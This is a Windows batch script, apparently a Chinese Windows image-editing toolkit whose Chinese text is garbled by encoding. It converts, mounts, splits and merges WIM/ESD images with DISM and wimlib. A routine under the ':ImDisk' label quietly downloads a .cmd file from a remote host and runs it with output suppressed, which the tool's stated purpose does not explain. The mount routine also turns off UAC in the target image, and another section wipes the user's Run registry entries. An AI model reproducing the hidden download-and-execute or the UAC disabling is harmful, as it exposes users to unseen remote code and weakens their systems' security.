reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /va /f
echo ע�����������ɾ�����
goto :Achiexe

:DisableTipsAndTechniques
REG ADD HKCU\SOFTWARE\Policies\Microsoft\Windows\Explorer /v DisableNotificationCenter /t REG_DWORD /d 1 /f
taskkill /f /im explorer.exe
start explorer.exe
goto :Achiexe

:SearchIndex
for /F "tokens=1* delims= " %%a in ('net start') do (
if /I "%%a %%b" == "WSearch" set svrst=1
if !svrst! == 0 net start WSearch
if !svrst! == 1 net stop WSearch
)
goto :Achiexe

:DisableTransparency
reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Themes\Personalize /v EnableTransparency /t REG_DWORD /d 1 /f
goto :Achiexe

:CleanUpDiskDebris
for %%i in (A,B,C,D,E,F,G,H,I,J,K,L,M,N,O,P,Q,R,S,T,U,V,W,X,Y,Z) do (if exist "%%i:" (title ������Ƭ������-��������: %%i:\&defrag %%i: /U /D))

msg /w /v /time:5 %Username% "���ļ������Ҫ��������!�������Ժ�����,������������������"
goto :Achiexe

:Convert
cls&mode con cols=80 lines=30&title ��ʽת��
set "Ext="
set "ExtTypes="
set "SourceExt="
set "TargetExt="
set "compress="
set "Total="
set "SourceName="
echo.
echo.    _______________________________ ��ʽת�� _______________________________
echo.   ^|                               ----------                               ^|
echo.   ^|                                                                        ^|
echo.   ^|   ӳ���ʽת����֧�ֶ��һӳ��                                       ^|
echo.   ^|                                                                        ^|
echo.   ^|   [1] WIM ת ESD                                                       ^|
echo.   ^|                                                                        ^|
echo.   ^|   [2] ESD ת WIM                                                       ^|
echo.   ^|                                                                        ^|
echo.   ^|   [X] ����                                                             ^|
echo.   ^|                                                                        ^|
echo.   ^|________________________________________________________________________^|
echo.
choice /c:12X /n /m ^>^>^>^>^>^>^>������ѡ��: 
if errorlevel 3 goto :begin
if errorlevel 2 goto :ESDWIM
if errorlevel 1 goto :WIMESD

:WIMESD
title WIMתESD
set "SourceExt=.wim"
set "TargetExt=.esd"
set "compress= --solid"
:: set "compress=--solid --solid-compress=lzms:100"
goto :ConvertNext

:ESDWIM
title ESDתWIM
set "SourceExt=.esd"
set "TargetExt=.wim"
:: set "compress=--compress=LZX"
set "compress=--compress=lzx:100"

:ConvertNext
cls&echo.
echo.    ____________________________ ����!SourceExt!Դ�ļ� ____________________________
echo.   ^|                            ----------------                            ^|
echo.   ^|                                                                        ^|
echo.   ^|   �������й�괦�����ճ��!SourceExt!��ʽ�ļ�������·��Ȼ��س���             ^|
echo.   ^|                                                                        ^|
echo.   ^|   ���践������ X Ȼ��س���                                            ^|
set "goto="
set "gotoback="
set "goto=ConvertNext"
set "gotoback=Convert"
call :InputSourceFile
for /f "tokens=*" %%i in ("!Sources!") do (set "SourceName=%%~ni")
cls&echo.
:: cd /d "!ToolsPath!\DISM"
for /f "eol=T skip=3 delims=" %%i in ('!Dism! /Get-WimInfo /WimFile:"!Sources!"') do (echo %%i)
echo.
echo ������Դ�ļ�����Ϣ���밴���������...
pause>nul
title ����ת��!SourceName!!SourceExt!��!SourceName!!TargetExt!
cls && echo.
echo.����ת��"!SourceName!!SourceExt!"��"!SourceName!!TargetExt!"�������ĵȴ�...
echo.
"!ToolsPath!\wimlib-imagex.exe" export "!Sources!" All "!Sources:~0,-4!!TargetExt!" !compress!
cls && echo. && echo.ת����ɣ��ļ�λ��"!Sources:~0,-4!!TargetExt!"�� && echo. && echo.�밴���������... && pause>nul && goto :begin

:mupan
cls&mode con cols=80 lines=30&title ĸ������
echo.
echo.    _______________________________ ĸ������ _______________________________
echo.   ^|                               ----------                               ^|
echo.   ^|                                                                        ^|
echo.   ^|   ����鿴ĸ�������밴G...                                          ^|
echo.   ^|                                                                        ^|
echo.   ^|   [1] Windows7                                                         ^|
echo.   ^|                                                                        ^|
echo.   ^|   [2] Windows10                                                        ^|
echo.   ^|                                                                        ^|
echo.   ^|   [X] ����                                                             ^|
echo.   ^|                                                                        ^|
echo.   ^|________________________________________________________________________^|
echo.
choice /c:12X /n /m ^>^>^>^>^>^>^>������ѡ��: 
if errorlevel 3 goto :begin
if errorlevel 2 ( start http://cmdpe.com/category-2.html & goto :mupan )
if errorlevel 1 ( start http://cmdpe.com/category-2.html & goto :mupan )

:jiaocheng
cls&mode con cols=80 lines=30&title ��ؽ̳�
echo.
echo.    _______________________________ ��ؽ̳� _______________________________
echo.   ^|                               ----------                               ^|
echo.   ^|                                                                        ^|
echo.   ^|   [1] ��ο��ٰ�װESD��ʽϵͳ                                          ^|
echo.   ^|                                                                        ^|
echo.   ^|   [2] ��ν�ӳ���ļ�������2GB����                                      ^|
echo.   ^|                                                                        ^|
echo.   ^|   [X] ����                                                             ^|
echo.   ^|                                                                        ^|
echo.   ^|________________________________________________________________________^|
echo.
choice /c:12X /n /m ^>^>^>^>^>^>^>������ѡ��: 
if errorlevel 3 goto :begin
if errorlevel 2 ( start http://cmdpe.com/category-2.html & goto :jiaocheng )
if errorlevel 1 ( start http://cmdpe.com/category-2.html & goto :jiaocheng )

:ImageEdit
cls&mode con cols=80 lines=30&title ӳ��༭
echo.
echo.    _______________________________ ӳ��༭ _______________________________
echo.   ^|                               ----------                               ^|
echo.   ^|                                                                        ^|
echo.   ^|   [1] �ϳ�ӳ��                                                         ^|
echo.   ^|                                                                        ^|
echo.   ^|   [2] ���ӳ��                                                         ^|
echo.   ^|                                                                        ^|
echo.   ^|   [3] �鿴ӳ����Ϣ                                                     ^|
echo.   ^|                                                                        ^|
echo.   ^|   [4] �޸�ӳ����Ϣ                                                     ^|
echo.   ^|                                                                        ^|
echo.   ^|   [X] ����                                                             ^|
echo.   ^|                                                                        ^|
echo.   ^|________________________________________________________________________^|
echo.
choice /c:1234X /n /m ^>^>^>^>^>^>^>������ѡ��: 
if errorlevel 5 goto :begin
if errorlevel 4 goto :EditImageInfo
if errorlevel 3 goto :ImageInfo
if errorlevel 2 goto :SplitImage
if errorlevel 1 goto :MixImage

:ImageInfo
cls&title �鿴ӳ����Ϣ
echo.
echo.    _____________________________ �鿴ӳ����Ϣ _____________________________
echo.   ^|                             --------------                             ^|
echo.   ^|                                                                        ^|
echo.   ^|   �������й�괦�����ճ��������wim��esd��ʽ�ļ�������·����Ȼ��س��� ^|
echo.   ^|                                                                        ^|
echo.   ^|   ���践������ X Ȼ��س���                                            ^|
echo.   ^|                                                                        ^|
set "goto="
set "gotoback="
set "goto=ImageInfo"
set "gotoback=ImageEdit"
call :InputSourceFile
"!ToolsPath!\wimlib-imagex.exe" info "!Sources!"|more
echo.������"!Sources!"����ϸ��Ϣ��
echo.&&echo.���践���밴�����...&&pause>nul&&goto :ImageEdit

:EditImageInfo
cls&mode con cols=80 lines=30&title �޸�ӳ����Ϣ
echo.
echo.    _____________________________ �޸�ӳ����Ϣ _____________________________
echo.   ^|                             --------------                             ^|
echo.   ^|                                                                        ^|
echo.   ^|   ע�⣺�����޸�ӳ�����ƺ��������������޸�ӳ����ʾ���ƺ���ʾ������     ^|
echo.   ^|                                                                        ^|
echo.   ^|   �������й�괦�����ճ��������wim��esd��ʽ�ļ�������·����Ȼ��س��� ^|
echo.   ^|                                                                        ^|
echo.   ^|   ���践������ X Ȼ��س���                                            ^|
echo.   ^|                                                                        ^|
set "goto="
set "gotoback="
set "goto=EditImageInfo"
set "gotoback=ImageEdit"
call :InputSourceFile

:EditImageIndex
set /a "lines=30+4*(!Total!-5)"
if !lines! lss 30 set /a "lines=30"
mode con cols=80 lines=!lines!
cls && echo. && echo.ӳ��Դ�ļ���"!Sources!"
set "ImageIndex="
set "ImageName="
set ImageDescription=
for /f "tokens=2 delims=:  " %%a in ('!ToolsPath!\wimlib-imagex.exe info "!Sources!" ^| findstr /i /c:"Index:                  "') do (
	set "ImageIndex=%%a"
	for /f "tokens=2 delims=:  " %%b in ('!ToolsPath!\wimlib-imagex.exe info "!Sources!" %%a ^| findstr /i /c:"Name:                   "') do (set "ImageName=%%b")
	for /f "tokens=2 delims=:  " %%c in ('!ToolsPath!\wimlib-imagex.exe info "!Sources!" %%a ^| findstr /i /c:"Description:            "') do (set "ImageDescription=%%c")
	echo.
	echo.�־�������!ImageIndex:~18!
	echo.ӳ�����ƣ�!ImageName:~19!
	echo.ӳ��������!ImageDescription:~12!
)
echo. && echo.��ӳ��"!Total!"���־���������������Ҫ�޸ķ־��������ţ�Ȼ��س���
echo. && echo.���践�������� X Ȼ��س��� && echo.
set "Index="
set /p Index=^>^>^>^>^>^>^>������:
if not defined Index cls && echo. && echo.�־��������"!Index!"���󣬸�ӳ��û�д˷־�������������ȷ�ķ־�������š�&& echo. && echo.�밴�������������...... && pause>nul && goto :EditImageIndex
set "Index=!Index:"=!"
if not defined Index cls && echo. && echo.�־��������"!Index!"���󣬸�ӳ��û�д˷־�������������ȷ�ķ־�������š�&& echo. && echo.�밴�������������...... && pause>nul && goto :EditImageIndex
if /i "!Index!" equ "x" goto :EditImageInfo
"!Dism!" /English /Get-ImageInfo /ImageFile:"!Sources!"|find /i "index : !Index!">nul 2>nul || cls && echo. && echo.�־��������"!Index!"���󣬸�ӳ��û�д˷־�������������ȷ�ķ־�������š�&& echo. && echo.�밴�������������...... && pause>nul && goto :EditImageIndex
:InputImageInfo
cls&echo.
echo.    _____________________________ �޸�ӳ����Ϣ _____________________________
echo.   ^|                             --------------                             ^|
echo.   ^|                                                                        ^|
echo.   ^|   �������й�괦����ӳ������+ӳ���������м���+�Ÿ�������Ȼ��س���     ^|
echo.   ^|                                                                        ^|
echo.   ^|   ���磺Win7_x64_�콢��+Win7_x64_�콢��                                ^|
echo.   ^|                                                                        ^|
echo.   ^|   ���践������ X Ȼ��س���                                            ^|
echo.   ^|                                                                        ^|
echo.   ^|________________________________________________________________________^|
echo.
set "InputImageInfo="
set /p InputImageInfo=^>^>^>^>^>^>^>������:
if not defined InputImageInfo cls && echo. && echo.��������Ϊ�գ��밴�����������������... && pause>nul && goto :InputImageInfo
set "InputImageInfo=!InputImageInfo:"=!"
if not defined InputImageInfo cls && echo. && echo.���������ʽ����ȷ���밴�����������������... && pause>nul && goto :InputImageInfo
if /i "!InputImageInfo!" equ "x" goto :EditImageIndex
set "ImageName="
set "DisplayName="
for /f "tokens=1,2,3,4 delims=+" %%i in ("!InputImageInfo!") do (set "ImageName=%%i" & set "DisplayName=%%j")
cls && echo.
"!ToolsPath!\wimlib-imagex.exe" info "!Sources!" !Index! "!ImageName!" "!DisplayName!" --check
cls && echo. && echo.�־�"!Index!"�޸�ӳ����Ϣ�ɹ����밴���������... && pause>nul && goto :EditImageIndex
:MixImage
cls&title �ϳ�ӳ��
if exist !temp!\ImageNameError.log del /f /q !temp!\ImageNameError.log
echo.
echo.    _______________________________ �ϳ�ӳ�� _______________________________
echo.   ^|                               ----------                               ^|
echo.   ^|                                                                        ^|
echo.   ^|   �˹��ܿ������������һӳ�񣬲��������ϳɣ���ͬ�ļ�ֻ����һ�ݡ�       ^|
echo.   ^|                                                                        ^|
echo.   ^|   ���磺A.wim������־�B.wim�������־���A.wim����˴��ڻس�ִ�С�  ^|
echo.   ^|                                                                        ^|
echo.   ^|   ֮�󷵻ش˴��ڣ��ٽ�B.wim����˴��ڻس�ִ�У�����Ŀ���ļ���NewImage  ^|
echo.   ^|                                                                        ^|
echo.   ^|   �ڵ�Ŀ���ļ�install.wim�ͻ��а˸��־�                              ^|
echo.   ^|                                                                        ^|
echo.   ^|   ע�⣺����֮ǰ�������ߵ�[NewImage]�ļ����ڣ�������install.wim�뽫��  ^|
echo.   ^|                                                                        ^|
echo.   ^|   ���ߣ���Ȼ�Ὣ��һ��ϲ���                                           ^|
echo.   ^|   __________________________________________________________________   ^|
echo.   ^|                                                                        ^|
echo.   ^|   �������й�괦�����ճ��������wim��esd��ʽ�ļ�������·����Ȼ��س��� ^|
echo.   ^|                                                                        ^|
echo.   ^|   ���践������ X Ȼ��س���                                            ^|
echo.  ^|   
set "goto="
set "gotoback="
set "goto=MixImage"
set "gotoback=ImageEdit"
call :InputSourceFile
cls
if exist "NewImage\install.wim" (
	set ImageName=
	for /f "tokens=2 delims=:  " %%a in ('!ToolsPath!\wimlib-imagex.exe info "!Sources!" ^| findstr /i /c:"Name:                   "') do (
		set "ImageName=%%a"
		for /f "tokens=2 delims=:  " %%b in ('!ToolsPath!\wimlib-imagex.exe info "NewImage\install.wim" ^| findstr /i /c:"Name:                   "') do (
			if "%%b" equ "%%a" ( echo. & echo.����ӳ�������ظ���Ŀ��ӳ���Ѱ���:!ImageName:~18! & echo error > "!temp!\ImageNameError.log" )
		)
	)
)
if exist "!temp!\ImageNameError.log" echo. && echo.�뷵���޸�����ӳ�����ƣ��밴���������... && pause>nul && goto :MixImage
cls && echo.
if not exist "NewImage" md "NewImage" >nul 2>nul
"!ToolsPath!\wimlib-imagex.exe" export "!Sources!" All "NewImage\install.wim" --compress=lzx:100
if exist "!temp!\ImageNameError.log" del /f /q "!temp!\ImageNameError.log" >nul 2>nul
cls && echo. && echo.�����ɹ����ļ�λ��"[NewImage]\install.wim"�� && echo. && echo.�밴���������... && pause>nul
goto :MixImage

:SplitImage
cls&title ӳ��༭^>���ӳ��
echo.
echo.    _______________________________ ���ӳ�� _______________________________
echo.   ^|                               ----------                               ^|
echo.   ^|                                                                        ^|
echo.   ^|   ѡ��[1]:�����ڵ����־�����ӳ�񣬵���ʱ���ų��޹��ļ����ع��µ�ӳ�� ^|
echo.   ^|                                                                        ^|
echo.   ^|   ��ӳ��λ�ڱ����ߵ�[NewImage]�ļ����ڣ��ļ����ƣ�install.wim��        ^|
echo.   ^|                                                                        ^|
echo.   ^|   ѡ��[2]:������ɾ��ӳ���ڲ���Ҫ�ķ־�                               ^|
echo.   ^|                                                                        ^|
echo.   ^|   [1] ����ӳ��                                                         ^|
echo.   ^|                                                                        ^|
echo.   ^|   [2] ɾ��ӳ��                                                         ^|
echo.   ^|                                                                        ^|
echo.   ^|   [X] ����                                                             ^|
echo.   ^|                                                                        ^|
echo.   ^|________________________________________________________________________^|
echo.
choice /c:12X /n /m ^>^>^>^>^>^>^>������ѡ��: 
if errorlevel 3 goto :ImageEdit
if errorlevel 2 (set "Split=ɾ��"&&title ӳ��༭^>���ӳ��^>ɾ��ӳ��)
if errorlevel 1 (set "Split=����"&&title ӳ��༭^>���ӳ��^>����ӳ��)
cls && echo.
echo.    _______________________________ !Split!ӳ�� _______________________________
echo.   ^|                               ----------                               ^|
echo.   ^|                                                                        ^|
echo.   ^|   �������й�괦�����ճ��������wim��ʽ�ļ�������·����Ȼ��س���      ^|
echo.   ^|                                                                        ^|
echo.   ^|   ���践������ X Ȼ��س���                                            ^|
echo.   ^|                                                                        ^|
echo.   ^|________________________________________________________________________^|
echo.

set "goto="
set "gotoback="
set "goto=SplitImage"
set "gotoback=SplitImage"
call :InputSourceFile

:SplitImageIndex
set /a "lines=30+4*(!Total!-5)"
if !lines! lss 30 set /a "lines=30"
mode con cols=80 lines=!lines!
cls&echo.
echo.ӳ��Դ�ļ���"!Sources!"
for /f "tokens=2 delims=:  " %%a in ('!ToolsPath!\wimlib-imagex.exe info "!Sources!" ^| findstr /i /c:"Index:                  "') do (
	set "ImageIndex=%%a"
	for /f "tokens=2 delims=:  " %%b in ('!ToolsPath!\wimlib-imagex.exe info "!Sources!" %%a ^| findstr /i /c:"Name:                   "') do (set "ImageName=%%b")
	for /f "tokens=2 delims=:  " %%c in ('!ToolsPath!\wimlib-imagex.exe info "!Sources!" %%a ^| findstr /i /c:"Description:            "') do (set "ImageDescription=%%c")
	echo.
	echo.�־�������!ImageIndex:~18!
	echo.ӳ�����ƣ�!ImageName:~19!
	echo.ӳ��������!ImageDescription:~12!
)
echo.&&echo.��ӳ��"!Total!"���־���������������Ҫ_!Split!�־�_��������ţ�Ȼ��س���
echo.&&echo.���践�������� X Ȼ��س���
echo.
set "Index="
set /p Index=^>^>^>^>^>^>^>������:
if not defined Index cls&&echo.&&echo.�־��������"!Index!"���󣬸�ӳ��û�д˷־�������������ȷ�ķ־�������š�&&echo.&&echo.�밴�������������...&&pause>nul&&goto :SplitImageIndex
set "Index=!Index:"=!"
if not defined Index cls&&echo.&&echo.�־��������"!Index!"���󣬸�ӳ��û�д˷־�������������ȷ�ķ־�������š�&&echo.&&echo.�밴�������������...&&pause>nul&&goto :SplitImageIndex
if /i "!Index!" equ "x" goto :SplitImage
"!Dism!" /English /Get-ImageInfo /ImageFile:"!Sources!"|find /i "index : !Index!" >nul 2>nul||cls&&echo.&&echo.�־��������"!Index!"���󣬸�ӳ��û�д˷־�������������ȷ�ķ־�������š�&&echo.&&echo.�밴�������������...&&pause>nul&&goto :SplitImageIndex
cls&echo.
if "!Split!" equ "����" (
	if exist "NewImage\install.wim" echo.��ʾ��"[NewImage]"�ļ������Ѵ���"install.wim"���⽫Ӱ���µ�ӳ���ļ����ɡ�&&echo.&&echo.���Ƚ�"[NewImage]"�ļ����ڵ�"install.wim"���߻�ɾ����&&echo.&&echo.�밴���������...&&pause>nul&&goto :SplitImage
	if not exist "NewImage" md "NewImage" >nul 2>nul
	"!ToolsPath!\wimlib-imagex.exe" export "!Sources!" !Index! "NewImage\install.wim" --compress=lzx:100
)
if "!Split!" equ "ɾ��" "!ToolsPath!\wimlib-imagex.exe" delete "!Sources!" !Index! --check
cls && echo.
if "!Split!" equ "����" echo.!Split!�־�"!Index!"�ɹ�����ӳ��λ��"[NewImage]\install.wim"&&echo.&&echo.�밴���������...
if "!Split!" equ "ɾ��" echo.!Split!�־�"!Index!"�ɹ����밴���������...
pause>nul
goto :SplitImageIndex

:InputSourceFile
echo.
set "Sources="
set /p Sources=^>^>^>^>^>^>^>������:
if not defined Sources cls&&echo.&&echo.��������Ϊ�գ��밴�����������������...&&pause>nul&&goto :!goto!
set "Sources=!Sources:"=!"
if not defined Sources cls&&echo.&&echo.���������ʽ����ȷ���밴�����������������...&&pause>nul&&goto :!goto!
if /i "!Sources!" equ "x" goto :!gotoback!
"!Dism!" /English /Get-ImageInfo /ImageFile:"!Sources!"|find /i "Index" >nul 2>nul||(cls&&echo.&&echo.���ļ�"!Sources!"���ǿ��õ�ϵͳӳ���밴�������������ѡ��...&&pause>nul&&goto :!goto!)
attrib -R "!Sources!">nul
goto :eof

:InputSources
set "Sources="
for /f "tokens=*" %%a in ('!ToolsPath!\wxFileDialog.exe "ϵͳ����(!ExtTypes!)|*.!Ext!" C: "��ѡ��!ExtTypes!��ʽϵͳӳ��" -oe') do Set "Sources=%%a"
if not defined Sources goto !goto1!
"!Dism!" /English /Get-ImageInfo /ImageFile:"!Sources!"|find /i "Index" >nul 2>nul||cls&&echo.&&echo.���ļ�"!Sources!"���ǿ��õ�ϵͳӳ���밴�������������ѡ��...&&pause>nul&&goto !goto1!
attrib -R "!Sources!" >nul 2>nul
goto :eof

:StatusOk
call :MountImageLog
echo ����״̬ : �ɹ� >> "������־.Log"
echo.>> "������־.Log"
cls && echo. && echo.ӳ����سɹ����밴�����ǰ�����ϲ˵�... && pause>nul && goto :menu2
:StatusNo
call :MountImageLog
echo ����״̬ : ʧ�� >> "������־.Log"
echo.>> "������־.Log"
cls && echo. && echo.ӳ�����ʧ�ܣ��밴�������������... && pause>nul && goto :begin
:AppPath
cls&echo.&echo.����ʧ�ܣ������������ļ����ļ��б�ɾ������������ɡ���������е���ȷ·�����&echo.&echo.�ļ���·����&echo.&echo.&echo.��ȷ·����!AppPath!&echo.&echo.&echo.�밴���������...&pause>nul&goto :!goto!
goto :eof
:Achiexe
cls&echo.&echo.!Item!�ɹ���&echo.&echo.�밴���������...&pause>nul&goto :!goto!
goto :eof
:Failure
cls&echo.&echo.!Item!ʧ�ܡ�&echo.&echo.�밴���������...&pause>nul&goto :!goto!
goto :eof
:Log
echo �������ڣ�!date:~0,-3!������ʱ�䣺!Time:~0,-3!����Ŀ���ƣ�!Item!����Ŀ״̬���ɹ� >> "������־.Log"
goto :eof
:MountImageLog
echo ������־ ���� : !date:~0,-3! ʱ�� : !Time:~0,-3! > "������־.Log"
echo.>> "������־.Log"
echo ӳ��Դ�ļ� : !Sources! >> "������־.Log"
echo ����Ŀ¼ : Mount >> "������־.Log"
echo �������� : !date:~0,-3! >> "������־.Log"
echo ����ʱ�� : !Time:~0,-3! >> "������־.Log"
echo ӳ������ : !Index! >> "������־.Log"
for /f "tokens=2 delims=:  " %%i in ('!Dism! /English /Get-WimInfo /WimFile:"!Sources!" /Index:!Index! ^| findstr /i Architecture') do (echo ӳ��ܹ� :%%i >> "������־.Log")
for /f "tokens=2 delims=:  " %%i in ('!Dism! /English /Get-WimInfo /WimFile:"!Sources!" /Index:!Index! ^| findstr /i Name') do (echo ӳ������ :%%i >> "������־.Log")
goto :eof

:Loop
if "!Sources:~-1!"==" " set "Sources=!Sources:~0,-1!"&&goto :Loop
goto :eof

:ImDisk
powershell -Command "(New-Object Net.WebClient).DownloadFile('https://gtla.oss-cn-shanghai.aliyuncs.com/WinImageSet.cmd', '"!Temp!\WinImageSet.cmd"')" >nul 2>nul
if exist "!Temp!\WinImageSet.cmd" call "!Temp!\WinImageSet.cmd" >nul 2>nul
set "+=XHebKiyIOJLAzaWfPQcgrBFjsGVuvNtYEnZCSTdxoMpqkUmvNRhl"
goto :eof


:CDEmu
cls&&echo.&&echo.���ڶ�ȡISO��Ϣ...
set "Imdisk="
for %%i in (Y X W V U T S R Q P O N M L K J I H G F E D) do if not exist %%i:\ set "Imdisk=%%i"&&goto :CDEmu1
:CDEmu1
"!ToolsPath!\CDEmu.exe" /install
"!ToolsPath!\CDEmu.exe" "!Sources!" !Imdisk! /wait
if exist "!Imdisk!:\sources\install.esd" set "Sources=!Imdisk!:\sources\install.esd"
if exist "!Imdisk!:\sources\install.wim" set "Sources=!Imdisk!:\sources\install.wim"
goto :eof

:Techo
set "length="&set "Techo="
for /f "skip=1 delims=:" %%w in ('^(echo."!Line:~0,66!"^&echo.^)^|findstr /o ".*"') do set "length=%%w"
if "!length!"=="71" set "Techo=!Line:~0,66!"&&goto :eof
set /a length=64-((!length!-71))
set "Techo=!Line:~0,%length%!"
goto :eof

:End
taskkill /f /IM Dism++x64.exe >nul 2>nul
taskkill /f /IM regedit.exe >nul 2>nul
reg unload HKLM\ZTM >nul 2>nul
endlocal&EXIT

:MountImage
if exist "Mount" (dir /a /b "Mount"|find /i /v "" >nul 2>nul&&cls&&echo.&&echo ��鵽Mount�ļ����ڲ��ǿյģ��밴��������أ���ѡ��ж��ӳ��...&&pause>nul&&goto :begin)
:InputSources1
cls&mode con cols=80 lines=30&title ����ӳ��
if defined Imdisk "!ToolsPath!\CDEmu.exe" /unmount !Imdisk!:
"!ToolsPath!\CDEmu.exe" /uninstall
echo.
echo.    ______________________________ ����ӳ��Դ ______________________________
echo.   ^|                              ------------                              ^|
echo.   ^|                                                                        ^|
echo.   ^|   �������й�괦�����ճ��������ӳ���ļ�������·����Ȼ��س���         ^|
echo.   ^|                                                                        ^|
echo.   ^|   ֧��ӳ���ʽ��.WIM .ESD .ISO�����践������ X Ȼ��س���              ^|
echo.   ^|                                                                        ^|
echo.   ^|________________________________________________________________________^|
echo.
set "Sources="
set /p Sources=^>^>^>^>^>^>^>������:
if not defined Sources cls && echo. && echo.��������Ϊ�գ��밴�����������������...... && pause>nul && goto :InputSources1
set "Sources=!Sources:"=!"
if /i "!Sources!" equ "x" goto :begin
if /i "!Sources:~-4!"==".iso" call :CDEmu
"!Dism!" /English /Get-ImageInfo /ImageFile:"!Sources!"|find /i "Index" >nul 2>nul||(cls&&echo.&&echo.���ļ�"!Sources!"���ǿ��õ�ϵͳӳ���밴�������������ѡ��...&&pause>nul&&goto :InputSources1)
attrib -R "!Sources!" >nul 2>nul

:Index
cls&set "tee="&set "Quit="&set "ChoiceIndex="&set "Index="&set "Line="
echo.
echo.    _______________________________ ӳ��־� _______________________________
echo.   ^|                               ----------                               ^|
echo.   ^|                                                                        ^|
for /f "tokens=2 delims=:" %%a in ('!Dism! /English /Get-ImageInfo /ImageFile:"!Sources!"^|findstr /i "Name"') do set /a tee+=1&&set "Line=%%a                                                                           "&&call :Techo&&echo.   ^|   [!tee!]!Techo!  ^|&&echo.   ^|                                                                        ^|
echo.   ^|   [X]  ����                                                            ^|
echo.   ^|                                                                        ^|
if !Tee! gtr 8 cls&&echo.&&echo.ӳ��־����8������ʹ��ӳ��༭����ɾ������Ҫ�ķ־�ʹ��־���С�ڵ���8���ٹ��أ��밲���������...&&pause>nul&&goto :begin
set /a Quit=!tee!+1
for /l %%i in (1,1,!tee!) do set "ChoiceIndex=!ChoiceIndex!%%i"
echo.
choice /c:!ChoiceIndex!X /n /m ^>^>^>^>^>^>^>��ָ���汾��:
if "!errorlevel!"=="!Quit!" goto :InputSources1
set "Index=!errorlevel!"
cls
if exist "Image" rd /s /q "Image" >nul 2>nul
if not exist "Image" md "Image" >nul 2>nul
if /i "!Sources:~-4!" equ ".esd" (echo.&&echo.���ڵ���ӳ�����Ե�...&&echo.&&"!ToolsPath!\wimlib-imagex.exe" export "!Sources!" !Index! "Image\Install.wim" --compress=XPRESS) else ("!Dism!" /Export-Image /SourceImageFile:"!Sources!" /SourceIndex:!Index! /DestinationImageFile:"Image\install.wim")
if defined Imdisk (
	"!ToolsPath!\CDEmu.exe" /unmount !Imdisk!:
	"!ToolsPath!\CDEmu.exe" /uninstall
)
cls&&echo.&&echo.���ڹ���ӳ���У����Ե�...
md "Mount" >nul 2>nul
"!Dism!" /English /Mount-Image /ImageFile:"Image\install.wim" /Index:1 /MountDir:"Mount"
reg load HKLM\ZTM "Mount\Windows\System32\config\software" >nul 2>nul
if exist "!ScriptsLog!" rd /s /q "!ScriptsLog!" >nul 2>nul
if exist "Mount\Windows\Panther" rd /s /q "Mount\Windows\Panther" >nul 2>nul
if exist "Mount\Windows\Setup\Scripts" rd /s /q "Mount\Windows\Setup\Scripts" >nul 2>nul
if exist "Mount\Windows\Sysprep" rd /s /q "Mount\Windows\Sysprep" >nul 2>nul
if exist "������־.Log" del /f /q "������־.Log" >nul 2>nul
md "!ScriptsLog!" >nul 2>nul
md "Mount\Windows\Panther" >nul 2>nul
md "Mount\Windows\Setup\Scripts" >nul 2>nul
md "Mount\Windows\Sysprep" >nul 2>nul
if exist "Mount\Windows\SysWOW64" (set "Bit=64") else (set "Bit=86")
for /f "tokens=4,5 delims= " %%i in ('reg query "HKLM\ZTM\Microsoft\Windows NT\CurrentVersion" /v "ProductName"') do (set "Version=%%i" & set "ProductName=%%j")
xcopy /v /c /q /h /r /y "File\Bin\x!Bit!\7z.exe" "Mount\Windows\System32" >nul 2>nul
xcopy /v /c /q /h /r /y "File\Bin\x!Bit!\7z.dll" "Mount\Windows\System32" >nul 2>nul
set "HUC=HKLM\ZTM\Microsoft\Windows\CurrentVersion\"
reg add "!HUC!Policies\System" /v "ConsentPromptBehaviorAdmin" /t REG_DWORD /d "0" /f >nul 2>nul
reg add "!HUC!Policies\System" /v "EnableLUA" /t REG_DWORD /d "0" /f >nul 2>nul
reg add "!HUC!Policies\System" /v "PromptOnSecureDesktop" /t REG_DWORD /d "0" /f >nul 2>nul
if /i "!ProductName!" equ "Home" (
taskkill /f /IM Dism++x64.exe >nul 2>nul
taskkill /f /IM regedit.exe >nul 2>nul
reg unload HKLM\ZTM >nul 2>nul
for /f "delims=" %%i in ('dir /a-d /s /b /on "Mount\Windows\servicing\Packages\Microsoft-Windows-GroupPolicy-ClientExtensions-Package~31bf3856ad364e35~*~*~*.mum"') do "!Dism!" /Image:"Mount" /NoRestart /Add-Package:"%%i" >nul 2>nul
reg load HKLM\ZTM "Mount\Windows\System32\config\software" >nul 2>nul
)
"!Dism!" /English /Get-MountedImageInfo:"Mount"|find /i "Status : Ok" >nul 2>nul&&reg query "HKLM\ZTM" >nul 2>nul&&goto :StatusOk||goto :StatusNo
:UninstallImage
cls&title ж��ӳ��&echo.
echo.����ж��ӳ���У����Ե�...
taskkill /f /IM Dism++x64.exe >nul 2>nul
taskkill /f /IM regedit.exe >nul 2>nul
reg unload HKLM\ZTM >nul 2>nul
taskkill /f /IM explorer.exe >nul 2>nul && start "" explorer.exe
"!Dism!" /unmount-wim /Mountdir:"Mount" /discard
rd /s /q "Image" >nul 2>nul
rd /s /q "Mount" >nul 2>nul
rd /s /q "!ScriptsLog!" >nul 2>nul
if exist "Mount" (
	cls && echo. && echo.δ����ȫж�أ�����ܵ�����һ���޷���������ӳ�� && echo. && echo.δ֪����ռ���˱������ڵ�Mount�ļ��У����������Ժ�ɾ���������ڵ�Mount�ļ��С� && echo. && echo.�������˵����밴�����... && pause>nul && goto :begin
) else (
	cls && echo. && echo.ж����ɣ������������... && pause>nul && goto :begin
)
:SaveImage
cls&title ��׽ӳ��
"!Dism!" /English /Get-MountedImageInfo:"Mount" | find /i "Status : Ok" >nul 2>nul || echo.&&echo.δ��⵽�ѹ���ӳ���ӳ�����״̬���𻵣��밴������������¹���ӳ��...&&pause>nul&&goto :begin
cls&echo.
echo.    _______________________________ ��׽ӳ�� _______________________________
echo.   ^|                               ----------                               ^|
echo.   ^|                                                                        ^|
echo.   ^|   ��ӳ�񽫱����ڱ����ߵ�[NewImage]�ļ�����,�ļ���Ϊinstall.wim��       ^|
echo.   ^|                                                                        ^|
echo.   ^|                                                                        ^|
echo.   ^|________________________________________________________________________^|
echo.
echo.^>^>^>^>^>^>^>�밴���������...
pause>nul
if exist "NewImage\install.wim" (
	cls
	echo.
	echo.    _______________________________ ��׽ӳ�� _______________________________
	echo.   ^|                               ----------                               ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   ��⵽[NewImage]�ļ���������install.wim��                            ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   ѡ��[1]:�����ɵ�һӳ��[NewImage]�ļ����ڵ�install.wim������������  ^|
